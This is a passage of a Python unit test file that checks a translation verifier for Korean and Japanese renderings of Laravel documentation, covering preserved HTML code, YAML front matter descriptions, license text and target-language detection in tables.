<!-- <tr><td><strong>Command</strong></td><td><code>php</code></td></tr> <tr><td><strong>Args</strong></td><td><code>artisan boost:mcp</code></td></tr> -->
<tr><td><strong>명령어</strong></td><td><code>php</code></td></tr>
<tr><td><strong>인수</strong></td><td><code>artisan boost:mcp</code></td></tr>
</table>
"""

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_rejects_changed_raw_html_code_contents(self):
        source = """<table>
<tr><td><strong>Command</strong></td><td><code>php</code></td></tr>
<tr><td><strong>Args</strong></td><td><code>artisan boost:mcp</code></td></tr>
</table>
"""
        translated = """<table>
<!-- <tr><td><strong>Command</strong></td><td><code>php</code></td></tr> <tr><td><strong>Args</strong></td><td><code>artisan boost:mcp</code></td></tr> -->
<tr><td><strong>コマンド</strong></td><td><code>破損コード</code></td></tr>
<tr><td><strong>引数</strong></td><td><code>別の破損</code></td></tr>
</table>
"""

        self.assertIn(
            "provider HTML code mismatch",
            response_contract.verify(translated, source, locale="ja"),
        )
        self.assertIn(
            "html code mismatch",
            verify.verify(translated, source=source),
        )

    def test_accepts_collapsed_soft_wrapped_source_paragraph(self):
        source = "First source line.\nSecond source line.\n"
        translated = """<!-- First source line. Second source line. -->
첫 번째와 두 번째 원문 줄을 번역한 문단입니다.
"""

        self.assertEqual(response_contract.verify(translated, source), [])

    def test_accepts_preserved_explicit_markdown_hard_break(self):
        source = "First source line.  \nSecond source line.\n"
        translated = (
            "<!-- First source line. Second source line. -->\n"
            "첫 번째 줄입니다.  \n"
            "두 번째 줄입니다.\n"
        )

        self.assertEqual(response_contract.verify(translated, source), [])

    def test_rejects_changed_nontranslatable_front_matter(self):
        source = """---
slug: cache
sidebar_position: 1
description: Cache guide.
---

Acquire the cache lock.
"""
        translated = """---
slug: キャッシュ
sidebar_position: 2
description: キャッシュガイドです。
---

<!-- Acquire the cache lock. -->
キャッシュロックを取得します。
"""

        self.assertIn(
            "provider front matter mismatch",
            response_contract.verify(translated, source),
        )

    def test_rejects_deleted_front_matter_description_value(self):
        source = """---
slug: cache
description: Cache guide.
---

Acquire the cache lock.
"""
        translated = """---
slug: cache
description:
---

<!-- Acquire the cache lock. -->
캐시 잠금을 획득합니다.
"""

        self.assertIn(
            "provider front matter mismatch",
            response_contract.verify(translated, source),
        )

    def test_rejects_untranslated_front_matter_description(self):
        source = """---
slug: cache
description: Guide to caching with atomic locks.
---

Acquire the cache lock.
"""
        translated = """---
slug: cache
description: Guide to caching with atomic locks.
---

<!-- Acquire the cache lock. -->
캐시 잠금을 획득합니다.
"""

        self.assertIn(
            "provider target language mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_rejects_untranslated_block_front_matter_description(self):
        source = """---
slug: cache
description: >-
  Guide to caching with
  atomic locks.
---

Acquire the cache lock.
"""
        translated = """---
slug: cache
description: >-
  Guide to caching with
  atomic locks.
---

<!-- Acquire the cache lock. -->
캐시 잠금을 획득합니다.
"""

        self.assertIn(
            "provider target language mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_accepts_translated_front_matter_description(self):
        source = """---
slug: cache
description: Guide to caching with atomic locks.
---

Acquire the cache lock.
"""
        translated = """---
slug: cache
description: atomic locks를 사용한 캐싱 안내입니다.
---

<!-- Acquire the cache lock. -->
캐시 잠금을 획득합니다.
"""

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_rejects_non_string_or_malformed_front_matter_description(self):
        source = """---
slug: cache
description: Cache guide.
---

Acquire the cache lock.
"""
        descriptions = (
            "{ko: 캐시 안내}",
            "[캐시 안내]",
            "캐시: 안내",
            '"캐시 안내',
            '"캐시 안내": ignored',
            "%캐시 안내",
            "]캐시 안내",
            "}캐시 안내",
            "true",
            "null",
            "42",
            "0xFF",
            "0b101",
            ".5",
            "01",
            "0_1",
            "+01",
            "1:20",
            "1_:20",
            "12:34:56.7",
            "2026-07-15T12:30:00Z",
            "1._0",
            "1.0_e0",
            "1_e0",
            "0x_1",
        )

        for description in descriptions:
            with self.subTest(description=description):
                translated = f"""---
slug: cache
description: {description}
---

<!-- Acquire the cache lock. -->
캐시 잠금을 획득합니다.
"""

                self.assertIn(
                    "provider front matter invalid",
                    response_contract.verify(translated, source, locale="ko"),
                )

    def test_accepts_supported_yaml_description_scalars(self):
        cases = (
            (
                'description: "Cache guide." # keep',
                'description: "캐시 안내입니다." # keep',
            ),
            (
                "description: Cache guide. # keep",
                "description: 캐시 안내입니다. # keep",
            ),
            (
                "description: |4- # keep\n    Cache guide.",
                "description: |4- # keep\n    캐시 안내입니다.",
            ),
            ("description: yes", "description: yes 캐시 안내입니다."),
            ("description: no", "description: no 캐시 안내입니다."),
            ("description: on", "description: on 캐시 안내입니다."),
            ("description: off", "description: off 캐시 안내입니다."),
            ("description: 0o17", "description: 0o17 캐시 안내입니다."),
            ("description: 0O17", "description: 0O17 캐시 안내입니다."),
            ("description: 0X10", "description: 0X10 캐시 안내입니다."),
            ("description: 0B11", "description: 0B11 캐시 안내입니다."),
            ("description: -.1", "description: -.1 캐시 안내입니다."),
            ("description: +.1", "description: +.1 캐시 안내입니다."),
            ("description: 2026-7-5", "description: 2026-7-5 캐시 안내입니다."),
            ("description: 1_", "description: 1_"),
            ("description: -9_", "description: -9_"),
            ("description: 1e2_0", "description: 1e2_0"),
            ("description: .1_", "description: .1_"),
            ("description: TrUe", "description: TrUe 캐시 안내입니다."),
            ("description: .nAn", "description: .nAn 캐시 안내입니다."),
        )

        for source_description, translated_description in cases:
            with self.subTest(source_description=source_description):
                source = f"""---
slug: cache
{source_description}
---

Acquire the cache lock.
"""
                translated = f"""---
slug: cache
{translated_description}
---

<!-- Acquire the cache lock. -->
캐시 잠금을 획득합니다.
"""

                self.assertEqual(
                    response_contract.verify(translated, source, locale="ko"),
                    [],
                )

    def test_rejects_changed_yaml_description_comment(self):
        source = """---
description: Cache guide. # keep
---

Acquire the cache lock.
"""
        translated = """---
description: 캐시 안내입니다. # changed
---

<!-- Acquire the cache lock. -->
캐시 잠금을 획득합니다.
"""

        self.assertIn(
            "provider front matter mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_rejects_invalid_block_description_indentation(self):
        source = """---
description: |
  Cache guide first line.
  Cache guide second line.
---

Acquire the cache lock.
"""
        descriptions = (
            "description: |\n  캐시 안내 첫 줄입니다.\n 캐시 안내 둘째 줄입니다.",
            "description: |\n    \n  캐시 안내입니다.",
        )

        for description in descriptions:
            with self.subTest(description=description):
                translated = f"""---
{description}
---

<!-- Acquire the cache lock. -->
캐시 잠금을 획득합니다.
"""

                self.assertIn(
                    "provider front matter invalid",
                    response_contract.verify(translated, source, locale="ko"),
                )

    def test_final_verifier_rejects_invalid_front_matter_description(self):
        source = """---
slug: cache
description: Cache guide.
---

Acquire the cache lock.
"""
        translated = """---
slug: cache
description: {ko: 캐시 안내}
---

<!-- Acquire the cache lock. -->
캐시 잠금을 획득합니다.
"""

        self.assertIn(
            "front matter description invalid",
            verify.verify(translated, source=source),
        )

    def test_allows_explicit_license_source_echo(self):
        source = "Permission is hereby granted to use this software.\n"
        translated = """<!-- Permission is hereby granted to use this software. -->
Permission is hereby granted to use this software.
"""

        self.assertEqual(
            response_contract.verify(
                translated,
                source,
                allow_source_echo=True,
            ),
            [],
        )

    def test_license_exception_does_not_allow_nonlegal_source_echo(self):
        source = "Read this introduction before reviewing the legal terms.\n"
        translated = """<!-- Read this introduction before reviewing the legal terms. -->
Read this introduction before reviewing the legal terms.
"""

        issues = response_contract.verify(
            translated,
            source,
            locale="ko",
            allow_source_echo=True,
        )

        self.assertIn("provider untranslated source text", issues)

    def test_license_exception_requires_legal_text_to_remain_unchanged(self):
        source = "Permission is hereby granted to use this software.\n"
        translated = """<!-- Permission is hereby granted to use this software. -->
Permission is hereby granted to modify this software.
"""

        self.assertIn(
            "provider license text mismatch",
            response_contract.verify(
                translated,
                source,
                locale="ko",
                allow_source_echo=True,
            ),
        )

    def test_rejects_short_english_response_for_locale(self):
        source = "Use atomic locks.\n"
        translated = """<!-- Use atomic locks. -->
Use atomic locks.
"""

        self.assertIn(
            "provider target language mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_rejects_two_word_english_response_for_locale(self):
        source = "Use locks.\n"
        translated = """<!-- Use locks. -->
Use locks.
"""

        self.assertIn(
            "provider target language mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_rejects_near_english_response_with_one_target_character(self):
        source = "Acquire the cache lock.\n"
        translated = """<!-- Acquire the cache lock. -->
Acquire the cache locks. 한
"""

        self.assertIn(
            "provider target language mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_rejects_near_english_response_with_a_short_korean_suffix(self):
        source = "Acquire the cache lock.\n"
        translated = """<!-- Acquire the cache lock. -->
Acquire the cache locks. 캐시잠금
"""

        self.assertIn(
            "provider target language mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_accepts_japanese_with_kanji_and_required_kana(self):
        source = "Use the cache lock.\n"
        translated = """<!-- Use the cache lock. -->
キャッシュロックを使用します。
"""

        self.assertEqual(
            response_contract.verify(translated, source, locale="ja"),
            [],
        )

    def test_ignores_complete_parenthesized_link_destination_in_language_check(self):
        suffix = "/" + "very-long-english-reference-segment-" * 8
        target = f"https://en.wikipedia.org/wiki/Mode_(statistics){suffix}"
        source = f"Read the [Mode reference]({target}).\n"
        translated = (
            f"<!-- Read the [Mode reference]({target}). -->\n"
            f"[Mode reference]({target})에서 읽으세요.\n"
        )

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_rejects_chinese_response_for_japanese_locale(self):
        source = "Acquire the cache lock.\n"
        translated = """<!-- Acquire the cache lock. -->
获取缓存锁。
"""

        self.assertIn(
            "provider target language mismatch",
            response_contract.verify(translated, source, locale="ja"),
        )

    def test_accepts_unchanged_bare_product_name_list(self):
        source = "- Redis\n- Memcached\n- DynamoDB\n"
        translated = """<!-- - Redis - Memcached - DynamoDB -->
- Redis
- Memcached
- DynamoDB
"""

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_rejects_an_untranslated_english_table(self):
        source = """| Feature | Description |
| --- | --- |
| Lock | Prevent writes |
"""

        self.assertIn(
            "provider target language mismatch",
            response_contract.verify(source, source, locale="ko"),
        )

    def test_rejects_one_untranslated_table_row(self):
        source = """| Feature | Description |
| --- | --- |
| Lock | Prevent writes |
| Cache | Stores values |
"""
        translated = """| 기능 | 설명 |
| --- | --- |
| Lock | Prevent writes |
| 캐시 | 값을 저장함 |
"""

        self.assertIn(
            "provider target language mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_accepts_an_unchanged_product_only_table(self):
        source = """| Driver | Backend |
| --- | --- |
| Redis | DynamoDB |
| Memcached | AWS |
"""
        translated = """| 드라이버 | 백엔드 |
| --- | --- |
| Redis | DynamoDB |
| Memcached | AWS |
"""

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_accepts_a_translated_table_with_an_escaped_pipe_in_code(self):
        source = """| Method | Description |
| --- | --- |
| `->days(array\\|mixed);` | Limit the task to specific days. |
"""
        translated = """| 메서드 | 설명 |
| --- | --- |
| `->days(array\\|mixed);` | 작업을 특정 요일로 제한합니다. |
"""

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_accepts_kanji_only_japanese_table_headers(self):
        source = """| Method | Description |
| --- | --- |
| `foo` | Run task. |
"""
        translated = """| 方法 | 説明 |
| --- | --- |
| `foo` | タスクを実行します。 |
"""

        self.assertEqual(
            response_contract.verify(translated, source, locale="ja"),
            [],
        )

    def test_accepts_preserved_product_and_version_cells_in_table_rows(self):
        source = """| Package | Versions Supported |
| --- | --- |
| Livewire | core, 2.x - 3.x |
| Folio | 1.x |
"""
        translated = """| 패키지 | 지원 버전 |
| --- | --- |
| Livewire | core, 2.x - 3.x |
| Folio | 1.x |
"""

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_accepts_preserved_facade_identifier_in_a_table_row(self):
        source = """| Facade | Class |
| --- | --- |
| App | `Illuminate\\Support\\Facades\\App` |
"""
        translated = """| 파사드 | 클래스 |
| --- | --- |
| App | `Illuminate\\Support\\Facades\\App` |
"""

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_translates_table_prose_while_preserving_a_2fa_identifier(self):
        source = """| Action | Description |
| --- | --- |
| Display 2FA challenge form | Show the authentication challenge. |
"""
        translated = """| 작업 | 설명 |
| --- | --- |
| 2FA 챌린지 양식 표시 | 인증 챌린지를 표시합니다. |
"""

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )
        self.assertIn(
            "provider target language mismatch",
            response_contract.verify(source, source, locale="ko"),
        )

    def test_accepts_preserved_version_editions_and_channel_lists(self):
        source = """| Package | Versions Supported |
| --- | --- |
| Boost | 2.x Free, 2.x Pro |
| Pennant | core, free, pro |
"""
        translated = """| 패키지 | 지원 버전 |
| --- | --- |
| Boost | 2.x Free, 2.x Pro |
| Pennant | core, free, pro |
"""

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_accepts_localized_japanese_punctuation_between_version_tokens(self):
        source = """| Package | Versions Supported |
| --- | --- |
| Laravel Framework | core, 10.x, 11.x |
"""
        translated = """| パッケージ | サポートバージョン |
| --- | --- |
| Laravel Framework | core、10.x、11.x |
"""

        self.assertEqual(
            response_contract.verify(translated, source, locale="ja"),
            [],
        )

    def test_accepts_preserved_release_dates(self):
        source = """| Version | Release Date |
| --- | --- |
| 13 | March 17th, 2026 |
"""
        translated = """| 버전 | 릴리스 날짜 |
| --- | --- |
| 13 | March 17th, 2026 |
"""

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_accepts_a_localized_japanese_release_date(self):
        source = """| Version | Release Date | PHP (*) |
| --- | --- | --- |
| 13 | March 17th, 2026 | 8.3 - 8.5 |
"""
        translated = """| バージョン | リリース日 | PHP(*) |
| --- | --- | --- |
| 13 | 2026年3月17日 | 8.3 - 8.5 |
"""

        self.assertEqual(
            response_contract.verify(translated, source, locale="ja"),
            [],
        )

    def test_accepts_identifier_only_mapping_rows(self):
        source = """| Action | Policy Method |
| --- | --- |
| index | viewAny |
| show | view |
"""
        translated = """| 작업 | 정책 메서드 |
| --- | --- |
| index | viewAny |
| show | view |
"""

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_accepts_preserved_skill_identifiers(self):
        source = """| Skill | Package |
| --- | --- |
| fluxui-development | Flux UI |
| inertia-react-development | Inertia |
"""
        translated = """| スキル | パッケージ |
| --- | --- |
| fluxui-development | Flux UI |
| inertia-react-development | Inertia |
"""

        self.assertEqual(
            response_contract.verify(translated, source, locale="ja"),
            [],
        )

    def test_translates_comma_separated_prose_in_a_skills_column(self):
        source = """| Skills | Description |
| --- | --- |
| Focused, task-specific | Best for a narrow task. |
"""
        translated = """| スキル | 説明 |
| --- | --- |
| 焦点を絞った、特定のタスク向け | 限定的なタスクに最適です。 |
"""
        english_value = translated.replace(
            "焦点を絞った、特定のタスク向け",
            "Focused, task-specific",
        )

        self.assertEqual(
            response_contract.verify(translated, source, locale="ja"),
            [],
        )
        self.assertIn(
            "provider target language mismatch",
            response_contract.verify(english_value, source, locale="ja"),
        )

    def test_accepts_preserved_type_and_configuration_values(self):
        source = """| Type | Default | Description |
| --- | --- | --- |
| boolean | (bool) true | Enable the server. |
| string | (string) '' | Set the prefix. |
"""
        translated = """| 타입 | 기본값 | 설명 |
| --- | --- | --- |
| boolean | (bool) true | 서버를 활성화합니다. |
| string | (string) '' | 접두사를 설정합니다. |
"""

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_accepts_localized_japanese_type_values(self):
        source = """| Type | Description |
| --- | --- |
| boolean | Flag value. |
| string | Text value. |
"""
        translated = """| 型 | 説明 |
| --- | --- |
| ブール値 | フラグ値です。 |
| 文字列 | テキスト値です。 |
"""

        self.assertEqual(
            response_contract.verify(translated, source, locale="ja"),
            [],
        )

    def test_accepts_parenthesized_env_literals(self):
        source = """| .env Value | Configuration Value |
| --- | --- |
| (true) | true |
| (empty) | '' |
"""
        translated = """| .env 값 | 구성 값 |
| --- | --- |
| (true) | true |
| (empty) | '' |
"""

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_accepts_an_html_entity_only_table_cell(self):
        source = """| Facade | Binding |
| --- | --- |
| Auth | &nbsp; |
"""
        translated = """| 파사드 | 바인딩 |
| --- | --- |
| Auth | &nbsp; |
"""

        self.assertEqual(
            response_contract.verify(translated, source, locale="ko"),
            [],
        )

    def test_accepts_a_long_product_list_in_a_providers_column(self):
        source = """| Providers | Notes |
| --- | --- |
| OpenAI, OpenAI Compatible, Anthropic, Gemini, Groq | Supported providers. |
"""
        translated = """| プロバイダー | 備考 |
| --- | --- |
| OpenAI、OpenAI Compatible、Anthropic、Gemini、Groq | 対応プロバイダーです。 |
"""

        self.assertEqual(
            response_contract.verify(translated, source, locale="ja"),
            [],
        )

    def test_rejects_untranslated_title_case_table_values(self):
        source = """| Action | Status |
| --- | --- |
| Delete | Deprecated |
"""
        translated = """| 작업 | 상태 |
| --- | --- |
| Delete | Deprecated |
"""

        self.assertIn(
            "provider target language mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_rejects_untranslated_title_case_table_phrase(self):
        source = """| Feature | Description |
| --- | --- |
| Lock | Prevent Writes |
"""
        translated = """| 기능 | 설명 |
| --- | --- |
| Lock | Prevent Writes |
"""

        self.assertIn(
            "provider target language mismatch",
            response_contract.verify(translated, source, locale="ko"),
        )

    def test_rejects_response_in_the_other_target_language(self):
        source = "Acquire the cache lock.\n"
        cases = (
            ("ko", "キャッシュロックを取得します。"),
            ("ja", "캐시 잠금을 획득합니다."),
        )

        for locale, body in cases:
            with self.subTest(locale=locale):
                translated = (
                    "<!-- Acquire the cache lock. -->\n"
                    f"{body}\n"
                )

                self.assertIn(
                    "provider target language mismatch",
                    response_contract.verify(translated, source, locale=locale),
                )


if __name__ == "__main__":
    unittest.main()
